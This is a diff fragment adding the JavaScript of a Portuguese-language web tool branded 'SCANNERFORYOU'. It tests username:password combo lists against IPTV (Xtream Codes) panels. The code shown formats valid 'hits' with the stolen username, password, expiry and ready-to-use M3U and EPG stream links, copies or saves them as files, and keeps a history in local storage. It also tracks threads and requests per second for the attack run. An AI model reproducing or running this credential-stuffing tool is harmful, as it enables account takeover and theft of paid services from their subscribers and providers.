+                        maxConnections: data.user_info.max_connections || 'Desconhecido',
+                        m3uLink: `${host}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+                        enigmaLink: `${host}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=enigma`,
+                        epgLink: `${host}/xmltv.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+                        counts: counts,
+                        categories: additionalData.categorias,
+                        data: data
+                    };
+                } else {
+                    return { valid: false };
+                }
+            } catch (error) {
+                clearTimeout(timeout);
+                throw error;
+            }
+        }
+        
+        // Obter informações adicionais de streams
+        async function fetchStreamData(host, user, pass) {
+            const baseUrl = host.startsWith('http') ? host : `http://${host}`;
+            const data = { canais: [], filmes: [], series: [], categorias: "" };
+            
+            async function fetchJson(url) {
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
+                    
+                    // Construir a URL do proxy
+                    const targetUrl = url;
+                    const proxyUrl = `/api/proxy?url=${encodeURIComponent(targetUrl)}`;
+                    
+                    const res = await fetch(proxyUrl, {
+                        signal: controller.signal,
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    
+                    clearTimeout(timeout);
+                    
+                    if (!res.ok) return [];
+                    return await res.json();
+                } catch {
+                    return [];
+                }
+            }
+            
+            try {
+                // Buscar categorias
+                const catUrl = `${baseUrl}/player_api.php?username=${user}&password=${pass}&action=get_live_categories`;
+                const catData = await fetchJson(catUrl);
+                
+                if (catData && catData.length > 0) {
+                    data.categorias = catData.map(cat => cat.category_name).join(" «✧» ");
+                } else {
+                    data.categorias = "❌ Nenhuma encontrada";
+                }
+            } catch {
+                data.categorias = "❌ Nenhuma encontrada";
+            }
+            
+            return data;
+        }
+        
+        // Parar scanner
+        function stopScanning() {
+            isScanning = false;
+            
+            if (abortController) {
+                abortController.abort();
+            }
+            
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            showNotification('Scanner parado pelo usuário!', 'warning');
+        }
+        
+        // Finalizar scanner
+        function finishScanning() {
+            isScanning = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            showNotification(`Scanner concluído! ${stats.hits} hits encontrados.`, 'success');
+            playNotificationSound();
+        }
+        
+        // Limpar resultados
+        function clearResults() {
+            results = [];
+            stats.total = 0;
+            stats.hits = 0;
+            stats.errors = 0;
+            stats.remaining = 0;
+            
+            resultsContainer.innerHTML = '';
+            updateStats();
+            updateProgress();
+            
+            copyAllBtn.disabled = true;
+            saveAllBtn.disabled = true;
+            
+            showNotification('Resultados limpos!', 'success');
+        }
+        
+        // Atualizar estatísticas
+        function updateStats() {
+            totalProcessedEl.textContent = stats.total;
+            hitsCountEl.textContent = stats.hits;
+            errorsCountEl.textContent = stats.errors;
+            activeBotsEl.textContent = stats.activeThreads;
+            remainingEl.textContent = stats.remaining;
+            
+            // Calcular requisições por segundo
+            if (stats.startTime > 0) {
+                const elapsed = (Date.now() - stats.startTime) / 1000;
+                const reqPerSec = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : 0;
+                reqPerSecEl.textContent = reqPerSec;
+            }
+        }
+        
+        // Atualizar barra de progresso
+        function updateProgress() {
+            const progress = combos.length > 0 ? (stats.total / combos.length) * 100 : 0;
+            progressFill.style.width = `${progress}%`;
+            progressText.textContent = `${progress.toFixed(1)}%`;
+        }
+        
+        // Renderizar resultado
+        function renderResult(result) {
+            const resultItem = document.createElement('div');
+            resultItem.className = 'result-item';
+            
+            const formattedResult = formatResult(result);
+            
+            resultItem.innerHTML = `
+                <div class="result-header">
+                    <h3 class="result-title">✅ HIT DETECTADO</h3>
+                    <div class="result-actions">
+                        <button class="btn btn-success copy-btn" data-index="${results.length - 1}">
+                            <i class="fas fa-copy"></i> Copiar
+                        </button>
+                    </div>
+                </div>
+                <div class="result-content">${formattedResult}</div>
+            `;
+            
+            resultsContainer.appendChild(resultItem);
+            
+            // Adicionar evento de cópia
+            const copyBtn = resultItem.querySelector('.copy-btn');
+            copyBtn.addEventListener('click', () => copyResult(results.length - 1));
+        }
+        
+        // Formatar resultado
+        function formatResult(result) {
+            return `✅HIT DETECTADO POR [SCANNERFORYOU] 
+--------------------------------
+📡 STATUS: ${result.status}
+🌍 SERVIDOR: ${result.host}
+👤 USUÁRIO: ${result.username}
+🔒 SENHA: ${result.password}
+📅 REGISTRO: Desconhecido
+⏳ VALIDADE: ${result.expiration}
+--------------------------------
+📺 CANAIS: ${result.counts.live}
+🎬 FILMES: ${result.counts.movies}
+🎞 SÉRIES: ${result.counts.series}
+🔢 TOTAL: ${result.counts.total}
+--------------------------------
+🔗 M3U: ${result.m3uLink}
+🔗 M3U+: ${result.m3uLink}
+🔗 EPG: ${result.epgLink}
+--------------------------------
+✅ [SCANNERFORYOU] ✅`;
+        }
+        
+        // Copiar resultado individual
+        function copyResult(index) {
+            if (index >= 0 && index < results.length) {
+                const result = results[index];
+                const formattedResult = formatResult(result);
+                
+                navigator.clipboard.writeText(formattedResult)
+                    .then(() => {
+                        showNotification('Hit copiado para a área de transferência!', 'success');
+                    })
+                    .catch(err => {
+                        showNotification('Erro ao copiar hit: ' + err, 'error');
+                    });
+            }
+        }
+        
+        // Copiar todos os resultados
+        function copyAllResults() {
+            if (results.length === 0) {
+                showNotification('Nenhum resultado para copiar!', 'warning');
+                return;
+            }
+            
+            let allResults = '';
+            results.forEach((result, index) => {
+                allResults += formatResult(result);
+                if (index < results.length - 1) {
+                    allResults += '\n\n';
+                }
+            });
+            
+            navigator.clipboard.writeText(allResults)
+                .then(() => {
+                    showNotification(`${results.length} hits copiados para a área de transferência!`, 'success');
+                })
+                .catch(err => {
+                    showNotification('Erro ao copiar resultados: ' + err, 'error');
+                });
+        }
+        
+        // Salvar todos os resultados
+        function saveAllResults() {
+            if (results.length === 0) {
+                showNotification('Nenhum resultado para salvar!', 'warning');
+                return;
+            }
+            
+            let allResults = '';
+            results.forEach((result, index) => {
+                allResults += formatResult(result);
+                if (index < results.length - 1) {
+                    allResults += '\n\n';
+                }
+            });
+            
+            const blob = new Blob([allResults], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            
+            // Extrair nome do host para o nome do arquivo
+            const hostName = new URL(results[0].host).hostname;
+            a.download = `hits_${hostName}_${new Date().toISOString().slice(0, 10)}.txt`;
+            
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showNotification(`${results.length} hits salvos com sucesso!`, 'success');
+        }
+        
+        // Adicionar ao histórico
+        function addToHistory(result) {
+            const historyItem = {
+                id: Date.now(),
+                date: new Date().toISOString(),
+                host: result.host,
+                username: result.username,
+                password: result.password,
+                expiration: result.expiration
+            };
+            
+            history.unshift(historyItem);
+            
+            // Manter apenas os últimos 50 itens
+            if (history.length > 50) {
+                history = history.slice(0, 50);
+            }
+            
+            // Salvar no localStorage
+            localStorage.setItem('scannerHistory', JSON.stringify(history));
+            
+            renderHistory();
+        }
+        
+        // Renderizar histórico
+        function renderHistory() {
+            historyContainer.innerHTML = '';
+            
+            if (history.length === 0) {
+                historyContainer.innerHTML = '<p>Nenhum item no histórico.</p>';
+                return;
+            }
+            
+            history.forEach(item => {
+                const historyItem = document.createElement('div');
+                historyItem.className = 'history-item';
+                
+                const date = new Date(item.date);
+                const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+                
+                historyItem.innerHTML = `
+                    <div>
+                        <strong>${item.host}</strong> - ${item.username}:${item.password}
+                        <div class="history-date">${formattedDate}</div>
+                    </div>
+                    <div class="history-actions">
+                        <button class="btn btn-success btn-sm" onclick="copyHistoryItem(${item.id})">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <button class="btn btn-danger btn-sm" onclick="removeHistoryItem(${item.id})">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                `;
+                
+                historyContainer.appendChild(historyItem);
+            });
+        }
+        
+        // Copiar item do histórico
+        function copyHistoryItem(id) {
+            const item = history.find(h => h.id === id);
+            if (item) {
+                const text = `${item.host}\n${item.username}:${item.password}`;
+                
+                navigator.clipboard.writeText(text)
+                    .then(() => {
+                        showNotification('Item copiado para a área de transferência!', 'success');
+                    })
+                    .catch(err => {
+                        showNotification('Erro ao copiar item: ' + err, 'error');
+                    });
+            }
+        }
+        
+        // Remover item do histórico
+        function removeHistoryItem(id) {
+            history = history.filter(h => h.id !== id);
+            localStorage.setItem('scannerHistory', JSON.stringify(history));
+            renderHistory();
+            showNotification('Item removido do histórico!', 'success');
+        }
+        
+        // Limpar histórico
+        function clearHistory() {
+            modalTitle.textContent = 'Confirmar Limpeza';
+            modalBody.textContent = 'Tem certeza de que deseja limpar todo o histórico?';
+            modal.dataset.action = 'clearHistory';
+            modal.style.display = 'flex';
+        }
+        
+        // Fechar modal
+        function closeModal() {
+            modal.style.display = 'none';
+            modal.dataset.action = '';
+        }
+        
+        // Confirmar ação do modal
+        function confirmModalAction() {
+            const action = modal.dataset.action;
+            
+            if (action === 'clearHistory') {
+                history = [];
+                localStorage.setItem('scannerHistory', JSON.stringify(history));
+                renderHistory();
+                showNotification('Histórico limpo com sucesso!', 'success');
+            }
+            
+            closeModal();
+        }
+        
+        // Mostrar notificação
+        function showNotification(message, type = 'success') {
+            notification.textContent = message;
+            notification.className = `notification notification-${type}`;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Reproduzir som de notificação
+        function playNotificationSound() {
+            notificationSound.play().catch(e => {
+                console.error('Erro ao reproduzir som de notificação:', e);
+            });
+        }
+        
+        // Mudar tema
+        function changeTheme(theme) {
+            document.body.dataset.theme = theme;
+            
+            themeButtons.forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            document.querySelector(`[data-theme="${theme}"]`).classList.add('active');
+        }
+        
+        // Inicializar aplicação
+        init();
+    </script>
+</body>
+</html>
